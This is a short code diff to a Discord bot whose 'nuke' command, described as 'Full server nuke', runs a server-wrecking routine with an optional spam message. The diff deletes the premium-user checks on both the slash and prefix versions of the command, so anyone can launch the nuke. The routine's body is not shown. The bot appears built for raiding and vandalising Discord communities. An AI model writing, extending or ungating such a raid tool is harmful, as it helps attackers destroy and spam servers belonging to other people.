@@ -122,8 +122,6 @@ async def on_ready():
 @client.tree.command(name="nuke", description="Full server nuke")
 @app_commands.describe(message="Custom spam message (optional)")
 async def nuke_slash(interaction: discord.Interaction, message: str = None):
-    if not is_premium(interaction.user.id):
-        return await interaction.response.send_message("❌ Premium Only!", ephemeral=True)
     await interaction.response.send_message("🚀 Nuke Started!", ephemeral=True)
     await nuke_guild(interaction.guild, message)
 
@@ -165,8 +163,6 @@ async def add_premium_slash(interaction: discord.Interaction, user: discord.User
 
 @client.command()
 async def nuke(ctx, *, message: str = None):
-    if not is_premium(ctx.author.id):
-        return await ctx.send("❌ Premium Only!")
     print(f'{y}[!] Nuke command executed in {ctx.guild.name} by {ctx.author}')
     await nuke_guild(ctx.guild, message)
 
